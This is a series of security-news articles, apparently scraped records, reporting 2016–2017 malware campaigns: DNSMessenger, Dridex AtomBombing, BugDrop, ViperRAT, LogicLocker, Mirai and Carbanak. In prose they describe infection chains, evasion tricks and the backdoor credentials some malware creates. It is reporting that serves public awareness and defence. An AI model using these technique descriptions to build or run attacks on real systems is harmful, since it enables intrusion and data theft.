technician/mobile service provider. It's not the first time when high-end smartphones have been shipped pre-installed with malicious apps that can covertly siphon sensitive user data. In December last year, certain low-cost Android smartphones and tablets were found to be shipped with malicious firmware that covertly gathered data about the infected devices, displays ads on top of running apps and downloads unwanted APKs on the victim's devices. In November, researchers discovered a hidden backdoor in the AdUps firmware of over 700 Million Android smartphones, which also covertly gathered data on phone owners and sent it to a Chinese server without the user's knowledge. Meanwhile, a flaw in the Ragentek firmware used by certain low-cost Android devices was also discovered that allowed attackers to remotely execute malicious code with root privileges, turning over full control of the devices to hackers." }

While new forms of cybercrime are on the rise, traditional activities seem to be shifting towards more clandestine techniques that involve the exploitation of standard system tools and protocols, which are not always monitored. The latest example of such attack is DNSMessenger – a new Remote Access Trojan (RAT) that uses DNS queries to conduct malicious PowerShell commands on compromised computers – a technique that makes the RAT difficult to detect onto targeted systems. The Trojan came to the attention of Cisco's Talos threat research group by a security researcher named Simpo, who highlighted a tweet that encoded text in a PowerShell script that said 'SourceFireSux.' SourceFire is one of Cisco's corporate security products. DNSMessenger Attack Is Completely Fileless Further analysis of the malware ultimately led Talos researchers to discover a sophisticated attack comprising a malicious Word document and a PowerShell backdoor communicating with its command-and-control servers via DNS requests. Distributed through an email phishing campaign, the DNSMessenger attack is completely Fileless, as it does not involve writing files to the targeted system; instead, it uses DNS TXT messaging capabilities to fetch malicious PowerShell commands stored remotely as DNS TXT records. This feature makes it invisible to standard anti-malware defenses. PowerShell is a powerful scripting language built into Windows that allows for the automation of system administration tasks. The malicious Word document has been crafted \"to appear as if it were associated with a secure e-mail service that is secured by McAfee,\" according to a blog post published by Talos researchers Edmund Brumaghin and Colin Grady on Thursday. Here's How the DNSMessenger attack Works: When opened, the document launches a Visual Basic for Applications (VBA) macro to execute a self-contained PowerShell script in an attempt to run the backdoor onto the target system. What's interesting? Everything, until this point, is done in memory, without writing any malicious files to the system's disk. Next, the VBA script unpacks a compressed and sophisticated second stage of PowerShell, which involves checking for several parameters of the target environment, like the privileges of the logged-in user and the version of PowerShell installed on the target system. This information is then used to ensure persistence on the infected host by changing the Windows Registry and installing a third stage PowerShell script that contains a simple backdoor. The backdoor is being added to the Windows Management Instrumentation (WMI) database, if the victim does have administrative access, allowing the malware backdoor to stay persistent on the system even after a reboot. The backdoor is an additional script that establishes a sophisticated 2-way communications channel over the Domain Name System (DNS) – usually used to look up the IP addresses associated with domain names, but has support for different types of records. The DNSMessenger malware backdoor uses DNS TXT records that, by definition, allows a DNS server to attach unformatted text to a response. The backdoor periodically sends DNS queries to one of a series of domains hard-coded in its source code. As part of those requests, it retrieves the domain's DNS TXT record, which contains further PowerShell commands that are executed but never written to the local system. Now, this \"fourth stage\" Powershell script is the actual remote control tool used by the malware attacker. This script queries the command-and-control servers via DNS TXT message requests to ask what commands to execute. Any command received is then executed, and the output is communicated back to the C&C server, allowing the attacker to execute any Windows or application commands on the infected system. All attackers need to do is leave malicious commands and instructions inside the TXT records of their domains, which, when queried, is executed via the Windows Command Line Processor, and the output is sent back as another DNS query. The domains registered by the DNSMessenger RAT are all down, so till now, it is not known that what types of commands the attackers relayed to infected systems. However, the researchers say this particular RAT was used in a small number of targeted attacks. \"This malware sample is an excellent example of the length attackers are willing to go to stay undetected while operating within the environments that they are targeting,\" the Talos researchers said. \"It also illustrates the importance that in addition to inspecting and filtering network protocols such as HTTP/HTTPS, SMTP/POP3, etc. DNS traffic within corporate networks should also be considered a channel that an attacker can use to implement a fully functional, bidirectional C2 infrastructure.\" This is not the first time when the researchers came across a Fileless malware. At early last month, Kaspersky researchers also discovered fileless malware, that resides solely in the memory of the compromised computers, targeting banks, telecommunication companies, and government organizations in 40 countries." }

Dridex is one of the most well-known Trojans that exhibits the typical behavior of monitoring a victim's traffic to bank sites by infiltrating victim PCs using macros embedded in Microsoft documents or via web injection attacks and then stealing online banking credentials and financial data. However, by including AtomBombing capabilities, Dridex becomes the first ever malware sample to utilize such sophisticated code injection technique to evade detection. What is \"AtomBombing\" Technique? Code injection techniques by previous versions of Dridex Trojan have become too common and easy to spot by antivirus and other security solutions. But since the AtomBombing technique is a different approach to code injection that does not rely on easy-to-detect API calls used by old Dridex versions, leveraging AtomBombing in the latest Dridex version made it difficult for antiviruses to detect. Initially spotted in October by Tal Liberman from enSilo security firm, AtomBombing is a code injection technique that could allow attackers to inject malicious code on every version of Microsoft's Windows OS, even Windows 10, in a manner that no existing anti-malware tools can detect. AtomBombing does not exploit any vulnerability but abuses the system-level Atom Tables, a feature of Windows that allows applications to store information on strings, objects, and other types of data to access on a regular basis. An attacker can write malicious code into an atom table and trick legitimate applications into retrieving it from the table to execute malicious actions on nearly any Windows operating system released in the past 16 years. Dridex Version 4 Discovered In the Wild According to IBM X-Force researchers, the Dridex banking Trojan recently underwent a major version upgrade, now supporting AtomBombing. But the malware author only went halfway which makes Dridex v4 different from other AtomBombing attacks — the attackers used \"the AtomBombing technique for the writing of the payload, then used a different method to achieve execution permissions, and for the execution itself.\" \"The flow differs from the one described in the AtomBombing technique. To get the payload into an executable memory space, Dridex simply calls NtProtectVirtualMemory from the injecting process to change the memory where the payload is already written into RWX,\" X-Force researchers said. Since using an APC call to the payload would have been very suspicious that could be detected and stopped, Dridex v4 uses \"the same GlobalGetAtomW method to patch GlobalGetAtomA, hooking it to execute the payload.\" Researchers said the new Dridex v4 is already in use in active campaigns against European banks, and it's only a matter of time before hackers begin targeting American financial institutions as well. Antivirus software and security products can now implement their systems to track and prevent Dridex v4 attacks since the IBM's findings are available for all. For a more detailed explanation and technical working of the latest version of Dridex Trojan, you can head on to IBM's blog post." }

It's a Trap! Scammers and hackers are targeting Google Chrome users with this new hacking scam that's incredibly easy to fall for, prompting users to download a fake Google Chrome font pack update just to trick them into installing malware on their systems. Here's What the Scam is and How it works: It's a \"The 'HoeflerText' font wasn't found\" scam. Security firm NeoSmart Technologies recently identified the malicious campaign while browsing an unnamed WordPress website that had allegedly already been compromised, possibly due to failing to apply timely security updates. The scam is not a new one to identified by NeoSmart. It has been making rounds since last month. The hackers are inserting JavaScript into poorly secured, but legitimate websites to modify the text rendering on them, which causes the sites to look all jumbled with mis-encoded text containing symbols and other random characters. So if Chrome users come across such websites from a search engine result or social media site, the script makes the website unreadable and prompts them to fix the issue by updating their 'Chrome font pack.' The prompt window says: \"The 'HoeflerText' font wasn't found,\" and you're then asked to update the \"Chrome Font Pack.\" If clicked, it actually installs a malware trojan on your machine. The scam can also be used to infect victims computer with Spora ransomware -- one of the most well-run ransomware operations, discovered at the start of this year, with active infection channels, advanced crypto, and an advanced ransom payment service. What makes this scam particularly appealing is that everything about the browser message looks legit, from the type of \"missing font\" and the dialog window to the Chrome logo and the right shade of blue on the \"update\" button. How to identify the Scam? There are several ways to recognize this scam. First of all, the dialog window has been hard-coded to show that you are running Chrome version 53 even if you actually aren't, which might be a clue that something is not right. Secondly, there's an issue with the filenames: Clicking the \"Update\" button proceeds to download an executable file titled \"Chrome Font v7.5.1.exe.\" But this file is not the one shown in the malicious instruction image, which reads \"Chrome_Font.exe.\" Even if you fail to identify these clues, you may get a standard warning, saying \"this file isn't downloaded often,\" when you try to download the file. Chrome Does Not Flag it as Malware However, what's strange is that the Chrome browser doesn't flag the file as malware, but the browser does block it because the file is not downloaded too often, which is a standard warning. NeoSmart Technologies has since run the malware through VirusTotal, which revealed that currently only 9 out of 59 anti-virus software in the database accurately identify the file as malware. So users are always recommended to exercise caution when downloading anything from the Internet onto their computers, to keep your antivirus software up-to-date and do not ever fall for scam asking you to update the Chrome font pack, as it already comes with everything you need." }

Late last year, the country also suffered a power outage caused by the same group of hackers that targeted Ukraine's power grid with the BlackEnergy malware in late 2015, causing 225,000 residents to lose electricity. Now security researchers from threat intelligence firm CyberX have uncovered an advanced malware-based operation that has already siphoned over 600 gigabytes of data from about 70 victim organizations, including critical infrastructure, news media, and scientific research. Operation BugDrop: Damages and Modus Operandi Dubbed \"Operation BugDrop,\" the large-scale malware campaign has been perpetrated against targets in the Ukraine, though targets from other countries include Russia, Saudi Arabia, and Austria. CyberX researchers did not identify the clandestine hacking collective but said Operation BugDrop was believed to be the work of highly skilled, government-backed nation-state hackers with nearly limitless resources. \"Operation BugDrop is a well-organized operation that employs sophisticated malware and appears to be backed by an organization with substantial resources,\" reads the CyberX blog post published Wednesday. \"In particular, the operation requires a massive back-end infrastructure to store, decrypt, and analyze several GB per day of unstructured data that is being captured from its targets. A large team of human analysts is also required to manually sort through captured data and process it manually and/or with Big Data-like analytics.\"Here's What the Malware Does: Operation BugDrop uses sophisticated malware that has been designed to infiltrate the victim's computer and capture screen shots, documents, and passwords, and turn on the PC's microphone to capture audio recordings of all conversations. The mysterious hacking group infects victims using malicious Microsoft Word documents sent in phishing emails. Once infected, the compromised PCs send the pilfered audio and data to Dropbox, where the hackers retrieve it. Since the malware uses PC microphones to bug targets and then send the audio and other data files to Dropbox, the researchers have dubbed the malware campaign Operation BugDrop. Here's How BugDrop Work:The hackers spread the malware through phishing emails containing Microsoft Office file attachments that include malicious macros embedded in it. Once the targets open the malware-laden Word document, the hidden, malicious Visual Basic scripts start running in a temporary folder in the background. The main module of BugDrop downloads the various data-stealing plugins to infected machines and executes them. All the stolen data the malware collects is then uploaded to Dropbox. Although BugDrop has mainly been designed to record audio files, the malware can also steal the documents, password and other sensitive data from the computer's browsers. Techniques BugDrop Use to Avoid Detection: The main malware downloader has low detection rates as: The malware makes the audio data look like legitimate outgoing traffic. BugDrop encrypts the DLLs that are installed to avoid detection by traditional anti-virus and sandboxing systems. The malware uses public cloud service Dropbox. BugDrop also uses Reflective DLL (Dynamic Link Library) Injection, a malware injection technique that had also been leveraged by the BlackEnergy malware used in the Ukrainian power grid attacks and the Duqu malware in the Stuxnet attacks on Iranian nuclear facilities. Reflective DLL Injection is used to load malicious code and effectively sidestep security verification procedures without calling the standard Windows API. Targets of BugDrop: The malware has targeted a wide range of industries including critical infrastructures, research centers in Ukraine and media organizations. According to CyberX, BugDrop's primary target has been Ukraine, but it has also been traced to other parts of Russia, Saudi Arabia, and Austria. Operation BugDrop targets identified by the CyberX researchers so far include: A firm that designs remote monitoring systems for oil and gas pipeline infrastructures. An engineering firm that designs electrical substations, water supply plants and gas distribution pipelines. An international organization that monitors counter-terrorism, human rights, and cyber attacks on critical infrastructure in the Ukraine. A scientific research institute. Editors of Ukrainian newspapers. While concluding the report, CyberX said both private and public sector organizations need to be more vigilant in monitoring their networks and applying more modern technologies like behavioral analytics to identify and quickly respond to these increasingly sophisticated cyber attacks." }

A newly released research by Lookout and Kaspersky suggests that more than 100 Israeli servicemen from the Israeli Defense Force (IDF) are believed to have been targeted with spyware. Dubbed ViperRAT, the malware has specifically been designed to hijack Israeli soldiers’ Android-based smartphones and remotely exfiltrate data of high value, including photos and audio recordings, directly from the compromised devices. Modus Operandi Identified According to the security firms, IDF personnel had been compromised by social engineering techniques — where the soldiers were lured via Facebook Messenger and other social networks into entering communications with hackers who posed as attractive women from various countries like Canada, Germany, and Switzerland. The soldiers were then tricked into installing a trojanized version of two different, typically legitimate Android chat apps, SR Chat and YeeCall Pro, for easier communication. The malware has also been distributed using a dropper hidden in other Android smartphone applications including a billiards game, an Israeli Love Songs player, and a Move To iOS app, which are common to Israeli citizens and available in the Google Play store. The app then scanned soldiers' smartphones and downloaded another malicious application that masqueraded as an update for one of the already installed apps, such as WhatsApp, and tricked victims to allow various permissions in order to carry out surveillance. This, in turn, allowed the attackers to execute on demand commands, enabling them to control phone's microphone and camera, eavesdrop on soldiers' conversations, and peer into live camera footage. Besides this, the ViperRAT malware gathers a broad range of data from compromised devices including geolocation, call log, personal photos, SMS messages, cell phone tower information, network and device metadata, internet browsing, and app download history. According to researchers, the hackers were able to successfully establish a widespread cyber espionage campaign by compromising dozens of mobile devices from Samsung, HTC, LG and Huawei belonging to over 100 Israeli soldiers. Besides, almost 9,000 files stolen from compromised devices (roughly 97 percent) that were exfiltrated from compromised devices were identified by Lookout researchers as being highly encrypted images, which were taken using the device camera. However, it's likely the IDF is not the only target. The ViperRAT attack campaign started in July and continued to date, according to Kaspersky researchers. Is Hamas Behind the Cyber-Spying Operation? The IDF closely worked with Kaspersky Labs and Lookout to investigate this incident and theorized that Hamas was behind these attacks. However, Lookout researchers have come to doubt that theory. According to Lookout researchers, \"Based on tradecraft, the modular structure of code and use of cryptographic protocols [AES and RSA encryption] the actor appears to be quite sophisticated.\" Researchers say Hamas is not known for sophisticated mobile capabilities, which makes it unlikely they are directly responsible for ViperRAT. The IDF is currently working together with both Lookout and Kaspersky to identify infected targets and protect against further attacks, but there is one simple way to protect against ViperRAT: don't download apps from untrusted third-party sources." }

Ransomware is a type of malware that infects computers and encrypts their content with strong encryption algorithms, and then demands a ransom to decrypt that data. It turned out to be a noxious game of Hackers to get paid effortlessly. Initially, ransomware used to target regular internet users, but in past few months, we have already seen the threat targeting enterprises, educational facilities, and hospitals, hotels, and other businesses. And now, the threat has gone Worse! This PoC Ransomware Could Poison Water Supply! Researchers at the Georgia Institute of Technology (GIT) have demonstrated the capability of ransomware to take down the critical infrastructure our cities need to operate, causing havoc among people. GIT researchers created a proof-of-concept ransomware that, in a simulated environment, was able to gain control of a water treatment plant and threaten to shut off the entire water supply or poison the city's water by increasing the amount of chlorine in it. Dubbed LogicLocker, the ransomware, presented at the 2017 RSA Conference in San Francisco, allowed researchers to alter Programmable Logic Controllers (PLCs) — the tiny computers that control critical Industrial Control Systems (ICS) and Supervisory Control and Data Acquisition (SCADA) infrastructure, like power plants or water treatment facilities. This, in turn, gave them the ability to shut valves, control the amount of chlorine in the water, and display false readouts. Sounds scary, Right? Fortunately, this has not happened yet, but researchers say this is only a matter of time. The simulated attack by researchers was created to highlight how attackers could disrupt vital services which cater to our critical needs, like water management utilities, energy providers, escalator controllers, HVAC (heating, ventilation and air conditioning) systems, and other mechanical systems. Over 1500 PLC Systems Open To Ransomware Attack LogicLocker targets three types of PLCs that are exposed online and infects them to reprogram the tiny computer with a new password, locking the legitimate owners out and demanding ransom while holding the utility hostage. If the owners pay, they get their control over the PLC back. But if not, the hackers could malfunction water plant, or worse, dump life-threatening amounts of chlorine in water supplies that could potentially poison entire cities. GIT researchers searched the internet for the two models of PLCs that they targeted during their experiment and found more than 1,500 PLCs that were exposed online. \"There are common misconceptions about what is connected to the internet,\" says researcher David Formby. \"Operators may believe their systems are air-gapped and that there's no way to access the controllers, but these systems are often connected in some way.\" Targeting industrial control and SCADA systems is not new, cybercriminals and nation-state actors are doing this for years, with programs like Stuxnet, Flame, and Duqu, but ransomware will soon add a financial element to these type of cyber attacks. Therefore, it is inevitable that money-motivated criminals will soon target critical infrastructure directly. Additionally, the nation-state actors could also hide their intentions under ransomware operators. So, it is high time for industrial control systems and SCADA operators to start adopting standard security practices like changing the PLCs default passwords, limiting their connections by placing them behind a firewall, scanning their networks for potential threats, and install intrusion monitoring systems." }

The X-Agent malware is tied to Russian hacking group known as APT28 — also known as Fancy Bear, Sofacy, Sednit, and Pawn Storm — that has been operating since at least 2007 and is allegedly linked to the Russian government. \"Our past analysis of samples known to be linked to APT28 group shows a number of similarities between the Sofacy/APT28/Sednit Xagent component for Windows/Linux and the Mac OS binary that currently forms the object of our investigation,\" Bitdefender reported in a blog post published Tuesday. \"For once, there is the presence of similar modules, such as FileSystem, KeyLogger, and RemoteShell, as well as a similar network module called HttpChanel.\" Like variants for other platforms, the Mac version of X-Agent spyware is also act as a backdoor with advanced cyber-espionage capabilities that can be customized depending on the objectives of an attack. Moreover, X-Agent is being planted by exploiting a vulnerability in the MacKeeper software installed on the targeted computers and known malware dropper Komplex — a first-stage trojan that APT28 uses to infect machines. Abovementioned evidence indicates that the newly discovered Mac version of X-Agent is also created by the same Russian hacking group. Once successfully installed, the backdoor checks for the presence of a debugger and if it finds one, it terminates itself to prevent execution. But if not, the backdoor waits for an Internet connection to communicate with the command-and-control servers. \"After the communication has been established, the payload starts the modules. Our preliminary analysis shows most of the C&C URLs impersonate Apple domains,\" Bitdefender researchers said. \"Once connected to the C&C, the payload sends a HelloMessage, then spawns two communication threads running in infinite loops. The former uses POST requests to send information to the C&C, while the latter monitors GET requests for commands.\" The Research is still ongoing and Bitdefender security researchers right now only have the Mac malware sample and not a full picture of how an attack works. APT28 is one of the two Russian-linked cyber-espionage groups that have been accused of hacking into the U.S. Democratic National Committee's email server last year and interfering with the 2016 presidential election.

Now, the infamous malware has updated itself to boost its distribution efforts. Researchers from Russian cyber-security firm Dr.Web have now uncovered a Windows Trojan designed to built with the sole purpose of helping hackers spread Mirai to even more devices. Mirai is a malicious software program for Linux-based internet-of-things (IoT) devices which scan for insecure IoT devices, enslaves them into a botnet network, and then used them to launch DDoS attacks, and spreads over Telnet by using factory device credentials. It all started early October last year when a hacker publicly released the source code of Mirai. Dubbed Trojan.Mirai.1, the new Trojan targets Windows computers and scans the user's network for compromisable Linux-based connected devices. Once installed on a Windows computer, the Trojan connects to a command-and-control (C&C) server from which it downloads a configuration file containing a range of IP addresses to attempt authentication over several ports such as 22 (SSH) and 23 (Telnet), 135, 445, 1433, 3306 and 3389. Successful authentication lets malware runs certain commands specified in the configuration file, depending on the type of compromised system. In the case of Linux systems accessed via Telnet protocol, the Trojan downloads a binary file on the compromised device, which subsequently downloads and launches Linux.Mirai. \"Trojan.Mirai.1's Scanner can check several TCP ports simultaneously. If the Trojan successfully connects to the attacked node via any of the available protocols, it executes the indicated sequence of commands,\" claimed the company in an advisory published this week. Once compromised, the Trojan can spread itself to other Windows devices, helping hackers hijack even more devices. Besides this, researchers noted that the malware could also identify and compromise database services running on various ports, including MySQL and Microsoft SQL to create a new admin “phpminds” with the password a “phpgodwith,” allowing attackers to steal the database. At this time it’s not known who created this, but the attack design demonstrates that your IoT devices that are not directly accessible from the internet can also get hacked to join the Mirai botnet army." }

Newly published report by the Russian security firm Kaspersky Lab indicates that hackers are targeting banks, telecommunication companies, and government organizations in 40 countries, including the US, South America, Europe and Africa, with Fileless malware that resides solely in the memory of the compromised computers. Fileless malware was first discovered by the same security firm in 2014, has never been mainstream until now. Fileless malware is a piece of nasty software that does not copy any files or folder to the hard drive in order to get executed. Instead, payloads are directly injected into the memory of running processes, and the malware executes in the system's RAM. Since the malware runs in the memory, the memory acquisition becomes useless once the system gets rebooted, making it difficult for digital forensic experts to find the traces of the malware. The attack was initially discovered by a bank's security team after they found a copy of Meterpreter — an in-memory component of Metasploit — inside the physical memory of a Microsoft domain controller. After conducting a forensic analysis, Kaspersky researchers found that the attackers leveraged Windows PowerShell to load the Meterpreter code directly into memory rather than writing it to the disk. The cyber crooks also used Microsoft's NETSH networking tool to set up a proxy tunnel for communicating with the command and control (C&C) server and remotely controlling the infected host. They also stashed the PowerShell commands into the Windows registry in an effort to reduce nearly all traces of the attacks left in logs or hard drive after a reboot of the device, making detection and forensic analysis difficult. The ultimate goal of the attackers was apparently aimed at compromising computers that control ATMs so that they could steal money. Kaspersky Lab researchers plan to reveal more details in April about the attack, which is occurring on an industrial scale worldwide. The attack has already hit more than 140 enterprise networks in business sectors, with most victims located in the US, France, Ecuador, Kenya, the UK, and Russia. And since the threat is so hard to spot, the actual number is likely much higher." }

What's surprising? The source of the malware infection is their own financial regulator, the Polish Financial Supervision Authority (KNF) -- which, ironically, is meant to keep an eye out for the safety and security of financial systems in Poland. During the past week, the security teams at several unnamed Polish banks discovered malicious executables on the workstations of several banks. The KNF confirmed that their internal systems had been compromised by someone \"from another country,\" although no specifications were provided. After downloads of suspicious files that were infecting various banking systems had been discovered on the regulator's servers, the KNF decided to take down its entire system \"in order to secure evidence.\" Here's what happened: An unknown attacker compromised the KNF's website for well over a week by modifying one of the site's JavaScript files, making visitors to the regulator's site load the malicious JavaScript file, which then downloaded the malicious payloads. Once downloaded and executed, the malware connected to some foreign servers to perform various malicious tasks such as reconnaissance, data exfiltration, and post exploitation. This particular malware appears to be a new strain of nasty software which has never seen before in live attacks and has a zero detection rate on VirusTotal. In some cases, the attackers even managed to gain control over critical servers within the targeted bank's infrastructures. Security blogger BadCyber spoke to several banks, and some 20 commercial banks across Poland have already confirmed being victims of a malware infection while other banks keep looking. The affected banks discovered the encrypted executable files on several servers and unusual network traffic going to uncommon IP addresses situated in other foreign countries. Both the KNF and the Polish government confirmed local Polish media that the investigation is ongoing and that there is no indication of people's money being affected in the attack and no operations were affected." }

Any guess, What kind of virus could have hit the storage devices? Once again, the culprit is Ransomware, which has become a noxious game of Hackers to get paid effortlessly. Ransomware is an infamous piece of malware that has been known for locking up computer files and then demanding a ransom in Bitcoins in order to help victims unlock their files. But over time, the threat has changed its way from computers and smartphones to Internet-of-Thing (IoT) devices. Ransomware Infected 70% Surveillance Cameras in Washington D.C. This time the hackers managed to plant ransomware in 123 of its 187 network video recorders, each controlling up to four CCTVs used in public spaces throughout Washington D.C, which eventually left them out from recording anything between 12 and 15 January. Officials told the Washington Post that the incident forced them to take the storage devices offline, remove the infection and rebooted the systems across the city, but did not fulfill any ransom demands by the hackers. While the storage devices were successfully put back to rights and the CCTV cameras were back to work, it is still unclear if any valuable data was lost or if the ransomware infection merely crippled the affected computer network devices. Washington's chief technology officer Archana Vemulapalli said the officials are now investigating the source of hacking, assuring that the incident was limited to the storage devices tied to closed-circuit TV system and did not affect other D.C. government networks. Rise in Ransomware: Both in Numbers and Sophistication Ransomware is the hackers sure-shot way to get paid effortlessly. The threat has been around for a few years, but nowadays it has become one of the most used types of hacking methods. Recently, hundreds of guests of a luxurious hotel in Austria were locked out of their rooms when ransomware malware hit the hotel's IT system, and the hotel paid the attackers to get back the control of their systems. We saw an enormous rise in Ransomware threats, both in numbers and sophistication. You would be surprised to know about KillDisk data wiping ransomware that encrypts files and asks for an unusually large ransom of around $218,000 in Bitcoins, but did not provide decryption keeps even after the payment has made. Another weird ransomware variant was Popcorn Time that was designed to give victims options to either pay a ransom to hackers or infect two more people and have them pay the ransom to get a free decryption key. Prevention is the Best Practice The only safe way of dealing with ransomware is prevention. The best defense against Ransomware malware is to create awareness within the organizations, as well as to maintain back-ups that are rotated regularly. Most viruses and infections are introduced by opening infected attachments or clicking on malicious links usually served in spam emails. So, don't click on links provided in emails and attachments from unknown sources. Besides this, always ensure that your systems and devices are running the latest version of Antivirus software with updated malware definitions." }

Recently, hundreds of guests of a luxurious hotel in Austria were locked in or out of their rooms when ransomware hit the hotel's IT system, and the hotel had no choice left except paying the attackers. Today, we are living in a digital age that is creating a digital headache for people and organizations around the world with cyber attacks and data breaches on the rise. Ransomware is one of them. The threat has been around for a few years, but during 2016, it has turned into a noxious game of Hackers to get paid effortlessly by targeting hospitals, Universities, private businesses and even police departments and making hundreds of millions of dollars. Now, the Romantik Seehotel Jäegerwirt 4-Star Superior Hotel has admitted it paid €1,500 (£1,275/$1,600) in Bitcoin ransom to cybercriminals who managed to break into their network and hack their electronic key card system that prevented its guests from entering or leaving their rooms. The luxury hotel with a beautiful lakeside setting on the Alpine Turracher Hoehe Pass in Austria, like several other hotels in the industry, has a modern IT system that includes key cards for its hotel doors, which could not be programmed. Also Read: This Tool Detects Never-Seen-Before Ransomware Before It Encrypts Your Data According to the hotel management, the hotel has been hit multiple times by hackers, but this time they managed to take down the entire key system, preventing its guests to getting in or going out of their rooms, reported The Local. Besides gaining control of the electronic key system, the hackers even gained control over the general computer system, shutting down all hotel computers, including the reservation system and the cash desk system. Once the hotel made the payment, the system was completely restored that allowed the hotel staff to gain access to the network and hotel guests to enter and exit their rooms. What's interesting? Even after the hotel fulfilled the hackers demand, the hackers left a backdoor to the hotel system in an attempt to conduct another cyber attack later. Fortunately, the security standards of the hotel had been improved by its IT department, and critical networks had been separated to thwart the attack, giving attackers no chance to harm the hotel again. Furious hotel managers decided to go public with the incident to warn others about the dangers of cyber attack, with Managing Director Christoph Brandstaetter said: \"The house was totally booked with 180 guests; we had no other choice. Neither police nor insurance helps you in this case. The restoration of our system after the first attack in summer has cost us several thousand Euros. We did not get any money from the insurance so far because none of those to blame could be found. Every euro that is paid to blackmailers hurts us. We know that other colleagues have been attacked, who have done similarly.\" The Ransomware had stolen the nights of many businesses and organizations, as they would often be blamed to fight up to this nasty threat. Ransomware criminals often demand the ransom in Bitcoin (BTC) for the surety of not getting caught, as Bitcoin transactions are non-trackable due to its decentralized nature. The frequent payment to Ransomware encourages criminals to stash the cash and develop a more enticing framework for the next target. So, instead of paying or encouraging this scheme, keep your software and systems updated and avoid clicking suspicious links." }

A new Trojan has been discovered in the wild that turns Linux-based devices into proxy servers, which attackers use to protect their identity while launching cyber attacks from the hijacked systems. Dubbed Linux.Proxy.10, the Trojan was first spotted at the end of last year by the researchers from Russian security firm Doctor Web, who later identified thousand of compromised machines by the end of January this year and the campaign is still ongoing and hunting for more Linux machines. According to researchers, the malware itself doesn't include any exploitation module to hack into Linux machines; instead, the attackers are using other Trojans and techniques to compromise devices at the first place and then create a new backdoor login account using the username as \"mother\" and password as \"fucker.\" Once backdoored and the attacker gets the list of all successfully compromised Linux machines, and then logs into them via SSH protocol and installs the SOCKS5 proxy server using Linux.Proxy.10 malware on it. This Linux malware is not at all sophisticated since it uses a freeware source code of the Satanic Socks Server to setup a proxy. According to the security firm, thousands of Linux-based devices have already been infected with this new Trojan. Besides this, the same server — belonging to the cybercriminals who distribute the Linux.Proxy.10 malware — not only contained the list of compromised devices but also hosted the control panel of a Spy-Agent computer monitoring software and a Windows malware from a known family of Trojan spyware, called BackDoor.TeamViewer. This is not the first time when such Linux malware has been discovered. Over a year ago, ESET security researchers uncovered a similar malware, dubbed Moose, that also had the capability to turn Linux devices into proxy servers that were then used for launching armies of fake accounts on social media networks, including Instagram, and Twitter. Linux users and administrators are recommended to tighten SSH security by limiting or disabling remote root access via SSH, and to know if your system has already been compromised, keep a regular watch on newly generated login users." }

Security researchers have discovered a new variant of the HummingBad malware hiding in more than 20 Android apps on Google Play Store. The infected apps were already downloaded by over 12 Million unsuspecting users before the Google Security team removed them from the Play Store. Dubbed HummingWhale by researchers at security firm Check Point, the new malware utilizes new, cutting-edge techniques that allow the nasty software to conduct Ad fraud better than ever before and generate revenue for its developers. The Check Point researchers said the HummingWhale-infected apps had been published under the name of fake Chinese developers on the Play Store with common name structure, com.[name].camera, but with suspicious startup behaviors. \"It registered several events on boot, such as TIME_TICK, SCREEN_OFF and INSTALL_REFERRER which [were] dubious in that context,\" Check Point researchers said in a blog post published Monday. HummingWhale Runs Malicious Apps in a Virtual Machine The HummingWhale malware is tricky than HummingBad, as it uses a disguised Android application package (APK) file that acts as a dropper which downloads and runs further apps on the victim's smartphone. If the victim notices and closes its process, the APK file then drops itself into a virtual machine in an effort to make it harder to detect. The dropper makes use of an Android plugin created by the popular Chinese security vendor Qihoo 360 to upload malicious apps to the virtual machine, allowing HummingWhale to further install other apps without having to elevate permissions, and disguises its malicious activity to get onto Google Play. \"This .apk operates as a dropper, used to download and execute additional apps, similar to the tactics employed by previous versions of HummingBad,\" researchers said. \"However, this dropper went much further. It uses an Android plugin called DroidPlugin, originally developed by Qihoo 360, to upload fraudulent apps on a virtual machine.\" HummingWhale Runs Without having to Root the Android Device Thanks to the virtual machine (VM), the HummingWhale malware no longer needs to root Android devices unlike HummingBad and can install any number of malicious or fraudulent apps on the victim's devices without overloading their smartphones. Once the victim gets infected, the command and control (C&C) server send fake ads and malicious apps to the user, which runs in a VM, generating a fake referrer ID used to spoof unique users for ad fraud purposes and generate revenue. Alike the original HummingBad, the purpose of HummingWhale is to make lots of money through ad fraud and fake app installations. Besides all these malicious capabilities, the HummingWhale malware also tries to raise its reputation on Google Play Store using fraudulent ratings and comments, the tactic similar to the one utilized by the Gooligan malware." }

The Carbanak cyber gang has been found abusing various Google services to issue command and control (C&C) communications for monitoring and controlling the machines of unsuspecting malware victims. Forcepoint Security Labs researchers said Tuesday that while investigating an active exploit sent in phishing messages as an RTF attachment, they discovered that the Carbanak group has been hiding in plain site by using Google services for command and control. \"The Carbanak actors continue to look for stealth techniques to evade detection,\" Forcepoint's senior security researcher Nicholas Griffin said in a blog post. \"Using Google as an independent C&C channel is likely to be more successful than using newly created domains or domains with no reputation.\" The RTF document features an embedded OLE object that contains a VBScript (Visual Basic Script), which is previously associated with the Carbanak malware, and uses social engineering to trick victims into clicking on an envelope image to \"unlock the contents.\" It turns out that the envelope image actually hides the embedded OLE object, so as soon as the victim double-clicks that picture, a dialog box opens asking if the victim wants to run the file unprotected.vbe. If the victim runs the file, Carbanak's VBScript malware will get executed, and, according to Forcepoint, the malware will \"send and receive commands to and from Google Apps Script, Google Sheets, and Google Forms services.\" Besides VBScript malware, Forcepoint researchers also discovered a new 'ggldr' script module encoded inside the main VBScript file along with various other VBScript modules, capable of using Google services as a command and control channel. \"The ‘ggldr’ script will send and receive commands to and from Google Apps Script, Google Sheets, and Google Forms services,\" \"For each infected user a unique Google Sheets spreadsheet is dynamically created to manage each victim,\" Griffin said. \"The use of a legitimate third party service like this one gives the attacker the ability to hide in plain sight. It is unlikely that these hosted Google services are blocked by default in an organization, so it is more likely that the attacker will establish a C&C channel successfully.\" Forcepoint researchers reckon it is probable that the hacking group is using Google services because these services are allowed by default at many companies and organizations, which makes it easier for hackers to exfiltrate data and send instructions. Carbanak, also known as Anunak, is one of the most successful cybercriminal operations in the world and is a highly organized group that continually evolves its tactics to carry out cyber crime while avoiding detection by potential targets and the authorities. The group was first exposed in 2015 as financially-motivated cybercriminals targeting mainly financial institutions. Since it started operating in 2013, Carbanak has stolen upwards of $1 Billion from more than 100 banks across the globe. Forcepoint has already notified Google of the issue, and its researchers are working with the web technology giant on this particular abuse of its legitimate web services." }

